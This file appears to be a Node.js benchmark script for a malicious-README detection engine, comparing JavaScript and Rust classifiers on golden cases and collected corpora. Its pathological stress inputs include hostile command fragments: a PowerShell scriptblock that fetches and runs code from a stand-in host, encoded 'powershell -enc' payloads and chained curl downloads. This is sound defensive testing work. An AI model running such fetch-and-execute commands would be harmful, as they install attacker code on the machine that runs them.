#!/usr/bin/env node
/**
 * Trendar Security Engine Benchmark & Golden Suite Runner
 *
 * Usage:
 *   node benchmarks/run-bench.mjs --engine=js --out=benchmarks/baseline-js.json
 *   node benchmarks/run-bench.mjs --engine=rust --out=benchmarks/result-rust.json
 */
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(__dirname, '..');

function parseArgs(argv) {
  const opts = { engine: 'js', out: null, iterations: 1 };
  for (const arg of argv.slice(2)) {
    if (arg.startsWith('--engine=')) opts.engine = arg.split('=')[1];
    else if (arg.startsWith('--out=')) opts.out = arg.split('=')[1];
    else if (arg.startsWith('--iterations=')) opts.iterations = Math.max(1, Number(arg.split('=')[1]) || 1);
  }
  return opts;
}

async function loadEngine(kind) {
  if (kind === 'js') {
    const mod = await import(path.join(ROOT, 'backend/src/services/readme-scan.js'));
    return {
      name: 'js-v3',
      classifyReadme: (text, meta) => mod.classifyReadme(text, meta),
      readmeTraits: (text, repo) => mod.readmeTraits(text, repo),
      analyzeManifest: null,
      simhashDistance: null,
    };
  }
  if (kind === 'rust') {
    const mod = await import(path.join(ROOT, 'backend/src/services/security-engine.js'));
    if (!mod.isNativeLoaded()) {
      throw new Error('Rust native NAPI-RS addon is not loaded. Run npm run build:engine first.');
    }
    return {
      name: 'rust-napi-v4',
      classifyReadme: (text, meta) => mod.classifyReadme(text, meta),
      readmeTraits: (text, repo) => mod.readmeTraits(text, repo),
      analyzeManifest: (input) => mod.analyzeManifest(input),
      simhashDistance: (a, b) => mod.simhashDistance(a, b),
    };
  }
  throw new Error(`Unknown engine: ${kind}`);
}

function loadCorpus() {
  const datasets = {};

  // 1. preserved 92 (malicious-repositories)
  const dir92 = path.join(ROOT, '.claude/specs/malicious-repositories/research/readmes');
  if (fs.existsSync(dir92)) {
    datasets.preserved_92 = fs.readdirSync(dir92).filter((f) => f.endsWith('.md')).sort().map((f) => {
      const base = f.slice(0, -3);
      const idx = base.indexOf('_');
      const owner = idx > 0 ? base.slice(0, idx) : 'unknown';
      const name = idx > 0 ? base.slice(idx + 1) : base;
      const text = fs.readFileSync(path.join(dir92, f), 'utf8');
      return { id: `${owner}/${name}`, owner, name, language: null, forks: 0, size: 1, text };
    });
  }

  // 2. live-2026-11-14 (162)
  const dirLive14 = path.join(ROOT, '.claude/specs/campaign-detection/research/live-2026-11-14');
  if (fs.existsSync(dirLive14)) {
    datasets.live_2026_11_14 = fs.readdirSync(dirLive14).filter((f) => f.endsWith('.meta')).sort().map((f) => {
      const cols = fs.readFileSync(path.join(dirLive14, f), 'utf8').trim().split('\t');
      const full = cols[0];
      const [owner, name] = full.split('/');
      const lang = cols[3] && cols[3] !== '-' ? cols[3] : null;
      const forks = Number(cols[4]);
      const size = Number(cols[5]);
      const stars = Number(cols[6]);
      const mdPath = path.join(dirLive14, f.replace(/\.meta$/, '.md'));
      const text = fs.existsSync(mdPath) ? fs.readFileSync(mdPath, 'utf8') : '';
      return { id: full, owner, name, language: lang, forks, size, stars, text };
    });
  }

  // 3 & 4. legit-2026-11-14 (1992) & older-2026-11-14 (1107)
  for (const [key, rel] of [
    ['legit_2026_11_14', '.claude/specs/campaign-detection/research/legit-2026-11-14'],
    ['older_2026_11_14', '.claude/specs/campaign-detection/research/older-2026-11-14'],
  ]) {
    const dir = path.join(ROOT, rel);
    const tsv = path.join(dir, 'uniq.tsv');
    if (fs.existsSync(tsv)) {
      const metaMap = new Map();
      for (const line of fs.readFileSync(tsv, 'utf8').trim().split('\n')) {
        if (!line) continue;
        const [full, lang, forks, size, owner] = line.split('\t');
        const fname = `${full.replace('/', '_')}.md`;
        metaMap.set(fname, {
          id: full,
          owner: owner || full.split('/')[0],
          name: full.split('/')[1],
          language: lang || null,
          forks: Number(forks),
          size: Number(size),
        });
      }
      datasets[key] = fs.readdirSync(dir).filter((f) => f.endsWith('.md')).sort().map((f) => {
        const meta = metaMap.get(f) ?? (() => {
          const base = f.slice(0, -3);
          const idx = base.indexOf('_');
          return { id: base, owner: base.slice(0, idx), name: base.slice(idx + 1), language: null, forks: 0, size: 100 };
        })();
        return { ...meta, text: fs.readFileSync(path.join(dir, f), 'utf8') };
      });
    }
  }

  // 5. live-2026-11-15 (242)
  const dirLive15 = path.join(ROOT, '.claude/specs/campaign-detection-pages/research/live-2026-11-15');
  if (fs.existsSync(dirLive15)) {
    datasets.live_2026_11_15 = fs.readdirSync(dirLive15).filter((f) => f.endsWith('.meta')).sort().map((f) => {
      const cols = fs.readFileSync(path.join(dirLive15, f), 'utf8').trim().split('\t');
      const full = cols[0];
      const [owner, name] = full.split('/');
      const lang = cols[3] && cols[3] !== '-' ? cols[3] : null;
      const forks = Number(cols[4]);
      const size = Number(cols[5]);
      const mdPath = path.join(dirLive15, f.replace(/\.meta$/, '.md'));
      const text = fs.existsSync(mdPath) ? fs.readFileSync(mdPath, 'utf8') : '';
      return { id: full, owner, name, language: lang, forks, size, text };
    });
  }

  return datasets;
}

function percentile(sorted, p) {
  if (!sorted.length) return 0;
  const idx = Math.min(sorted.length - 1, Math.floor((p / 100) * sorted.length));
  return sorted[idx];
}

function buildPathologicalInputs() {
  const encodedOk = Buffer.from('Write-Host ok ok ok', 'utf16le').toString('base64');
  return [
    ['curl_repeat', 'curl '.repeat(100_000)],
    ['irm_pipe_long', `${'irm '.repeat(50_000)}| ${'x'.repeat(200_000)}`],
    ['disable_windows', `disable ${'windows '.repeat(60_000)}`],
    ['save_chain', 'curl -o a http://x.yy/z && '.repeat(18_000)],
    ['scriptblock_spaces', `[scriptblock]::create((irm https://e.com/x)) & ${' '.repeat(500_000)}x`],
    ['enc_480k', `powershell -enc ${'A'.repeat(480_000)}`],
    ['enc_8k_repeats', `powershell -enc ${encodedOk} `.repeat(8_000)],
    ['url_250k', `https://${'a'.repeat(250_000)}\n`],
    ['dropbox_17k', 'https://www.dropbox.com/scl/fi/'.repeat(17_000)],
    ['bad_urls_58k', 'http://[ '.repeat(58_000)],
    ['headings_60k', '# h\n'.repeat(60_000)],
    ['zip_releases_dots', `${'a.'.repeat(260_000)}zip releases`],
    ['backtick_cr', `${'`'.repeat(524_000)}\rX`],
    ['tilde_ls', `${'~'.repeat(524_000)}\u2028X`],
    ['url_trailing_dots', `${`https://a.b/${'.'.repeat(1990)} `.repeat(260)}`],
  ].map(([name, text]) => [name, text.slice(0, 524_288)]);
}

function evalGolden(engine, golden) {
  const byCategory = {};
  const details = [];
  for (const c of golden.readme_cases) {
    byCategory[c.category] ??= { total: 0, passed: 0, fp: 0, fn: 0 };
    byCategory[c.category].total++;
    const res = engine.classifyReadme(c.readme, c.repo);
    const actual = res.verdict === 'malicious' ? 'malicious' : 'clean';
    const pass = actual === c.expected;
    if (pass) byCategory[c.category].passed++;
    else if (c.expected === 'clean' && actual === 'malicious') byCategory[c.category].fp++;
    else if (c.expected === 'malicious' && actual === 'clean') byCategory[c.category].fn++;
    details.push({ id: c.id, category: c.category, expected: c.expected, actual, pass, score: res.score ?? null });
  }

  const traitsResults = [];
  for (const tc of golden.traits_cases) {
    if (tc.id === 'evasion-ref-link-filehost') {
      const t = engine.readmeTraits(tc.readme, tc.repo);
      const pass = Boolean(t.archiveFilehostUrl) === tc.expect_archive_filehost && t.lure === tc.expect_lure;
      traitsResults.push({ id: tc.id, pass, archiveFilehostUrl: t.archiveFilehostUrl, lure: t.lure });
    } else if (tc.id === 'evasion-fuzzy-simhash-comment-mutation') {
      const a = engine.readmeTraits(tc.readme_a, tc.repo_a);
      const b = engine.readmeTraits(tc.readme_b, tc.repo_b);
      const exactMatch = Boolean(a.textKey && a.textKey === b.textKey);
      const dist = (a.simhash && b.simhash && engine.simhashDistance) ? engine.simhashDistance(a.simhash, b.simhash) : null;
      const fuzzyMatch = dist !== null && dist <= 5;
      traitsResults.push({ id: tc.id, pass: exactMatch || fuzzyMatch, exactMatch, simhashDistance: dist });
    }
  }

  const manifestResults = [];
  if (engine.analyzeManifest) {
    for (const mc of golden.manifest_opt_in_cases) {
      const res = engine.analyzeManifest({ files: mc.files ?? [], tree: mc.tree ?? [] });
      const actual = res.verdict === 'malicious' ? 'malicious' : 'clean';
      manifestResults.push({ id: mc.id, expected: mc.expected, actual, pass: actual === mc.expected, score: res.score });
    }
  }

  return { byCategory, details, traitsResults, manifestResults };
}

function evalCorpus(engine, datasets, iterations) {
  const allDocs = [];
  for (const [name, rows] of Object.entries(datasets)) {
    for (const r of rows) allDocs.push({ dataset: name, ...r });
  }
  const totalBytes = allDocs.reduce((sum, d) => sum + Buffer.byteLength(d.text, 'utf8'), 0);

  // Warmup
  for (const d of allDocs.slice(0, 50)) {
    const cls = engine.classifyReadme(d.text, d);
    if (!cls.traits) engine.readmeTraits(d.text, d);
  }

  if (global.gc) global.gc();
  const memBefore = process.memoryUsage();
  const latencies = [];
  const datasetStats = {};
  const perDatasetOwners = {};

  let totalMs = 0;
  let peakRss = memBefore.rss;
  let peakHeap = memBefore.heapUsed;

  for (let iter = 0; iter < iterations; iter++) {
    const tIter = performance.now();
    for (const d of allDocs) {
      const t0 = performance.now();
      const cls = engine.classifyReadme(d.text, d);
      const tr = cls.traits ?? engine.readmeTraits(d.text, d);
      const dt = performance.now() - t0;
      if (iter === 0) {
        latencies.push(dt);
        datasetStats[d.dataset] ??= { total: 0, direct_malicious: 0, archive_filehost: 0, lure: 0, flagged_ids: [] };
        const st = datasetStats[d.dataset];
        st.total++;
        if (cls.verdict === 'malicious') {
          st.direct_malicious++;
          st.flagged_ids.push(d.id);
        }
        if (tr.archiveFilehostUrl) st.archive_filehost++;
        if (tr.lure) st.lure++;

        // Track cluster keys per dataset
        if (tr.lure) {
          perDatasetOwners[d.dataset] ??= { text: new Map(), skel: new Map(), docs: [] };
          const owner = d.owner.toLowerCase();
          if (tr.textKey) {
            if (!perDatasetOwners[d.dataset].text.has(tr.textKey)) perDatasetOwners[d.dataset].text.set(tr.textKey, new Set());
            perDatasetOwners[d.dataset].text.get(tr.textKey).add(owner);
          }
          if (tr.skeletonKey) {
            if (!perDatasetOwners[d.dataset].skel.has(tr.skeletonKey)) perDatasetOwners[d.dataset].skel.set(tr.skeletonKey, new Set());
            perDatasetOwners[d.dataset].skel.get(tr.skeletonKey).add(owner);
          }
          perDatasetOwners[d.dataset].docs.push({ id: d.id, textKey: tr.textKey, skeletonKey: tr.skeletonKey, direct: cls.verdict === 'malicious' });
        }
      }
    }
    totalMs += performance.now() - tIter;
    const m = process.memoryUsage();
    if (m.rss > peakRss) peakRss = m.rss;
    if (m.heapUsed > peakHeap) peakHeap = m.heapUsed;
  }

  for (const [ds, info] of Object.entries(perDatasetOwners)) {
    let clusterHidden = 0;
    let totalHidden = datasetStats[ds].direct_malicious;
    for (const doc of info.docs) {
      const inCluster =
        (doc.textKey && (info.text.get(doc.textKey)?.size ?? 0) >= 3) ||
        (doc.skeletonKey && (info.skel.get(doc.skeletonKey)?.size ?? 0) >= 3);
      if (inCluster) {
        clusterHidden++;
        if (!doc.direct) totalHidden++;
      }
    }
    datasetStats[ds].cluster_hidden = clusterHidden;
    datasetStats[ds].total_hidden = totalHidden;
  }

  latencies.sort((a, b) => a - b);
  const avgIterMs = totalMs / iterations;

  return {
    total_docs: allDocs.length,
    total_mb: Number((totalBytes / (1024 * 1024)).toFixed(2)),
    iterations,
    avg_total_ms: Number(avgIterMs.toFixed(2)),
    docs_per_sec: Number((allDocs.length / (avgIterMs / 1000)).toFixed(1)),
    mb_per_sec: Number(((totalBytes / (1024 * 1024)) / (avgIterMs / 1000)).toFixed(2)),
    latency_ms: {
      p50: Number(percentile(latencies, 50).toFixed(4)),
      p95: Number(percentile(latencies, 95).toFixed(4)),
      p99: Number(percentile(latencies, 99).toFixed(4)),
      max: Number((latencies[latencies.length - 1] ?? 0).toFixed(4)),
    },
    memory_mb: {
      rss_before: Number((memBefore.rss / (1024 * 1024)).toFixed(2)),
      rss_peak: Number((peakRss / (1024 * 1024)).toFixed(2)),
      heap_before: Number((memBefore.heapUsed / (1024 * 1024)).toFixed(2)),
      heap_peak: Number((peakHeap / (1024 * 1024)).toFixed(2)),
    },
    datasets: Object.fromEntries(
      Object.entries(datasetStats).map(([k, v]) => [k, {
        total: v.total,
        direct_malicious: v.direct_malicious,
        cluster_hidden: v.cluster_hidden ?? 0,
        total_hidden: v.total_hidden ?? v.direct_malicious,
        archive_filehost: v.archive_filehost,
        lure: v.lure,
        // Keep flagged list only for small sets / older FP inspection
        ...(k === 'older_2026_11_14' ? { flagged_ids: v.flagged_ids } : {}),
      }]),
    ),
  };
}

function evalPathological(engine) {
  const inputs = buildPathologicalInputs();
  const totalBytes = inputs.reduce((s, [, t]) => s + Buffer.byteLength(t, 'utf8'), 0);
  const perCase = [];
  const tStart = performance.now();
  for (const [name, text] of inputs) {
    const t0 = performance.now();
    const cls = engine.classifyReadme(text, { owner: 'o', name: 'r', language: null, forks: 0, size: 1 });
    if (!cls.traits) engine.readmeTraits(text, { owner: 'o', name: 'r' });
    perCase.push({ name, ms: Number((performance.now() - t0).toFixed(2)) });
  }
  const totalMs = performance.now() - tStart;
  return {
    cases: inputs.length,
    total_mb: Number((totalBytes / (1024 * 1024)).toFixed(2)),
    total_ms: Number(totalMs.toFixed(2)),
    max_case_ms: Number(Math.max(...perCase.map((c) => c.ms)).toFixed(2)),
    mb_per_sec: Number(((totalBytes / (1024 * 1024)) / (totalMs / 1000)).toFixed(2)),
    perCase,
  };
}

const opts = parseArgs(process.argv);
const engine = await loadEngine(opts.engine);
const golden = JSON.parse(fs.readFileSync(path.join(__dirname, 'fixtures/golden.json'), 'utf8'));
const datasets = loadCorpus();

const report = {
  timestamp: new Date().toISOString(),
  engine: engine.name,
  node_version: process.version,
  golden: evalGolden(engine, golden),
  corpus: evalCorpus(engine, datasets, opts.iterations),
  pathological: evalPathological(engine),
};

if (opts.out) {
  fs.writeFileSync(path.resolve(ROOT, opts.out), JSON.stringify(report, null, 2) + '\n');
}

console.log(JSON.stringify({
  engine: report.engine,
  golden_summary: report.golden.byCategory,
  golden_traits: report.golden.traitsResults,
  golden_manifest: report.golden.manifestResults,
  corpus: report.corpus,
  pathological: {
    total_mb: report.pathological.total_mb,
    total_ms: report.pathological.total_ms,
    max_case_ms: report.pathological.max_case_ms,
    mb_per_sec: report.pathological.mb_per_sec,
  },
}, null, 2));
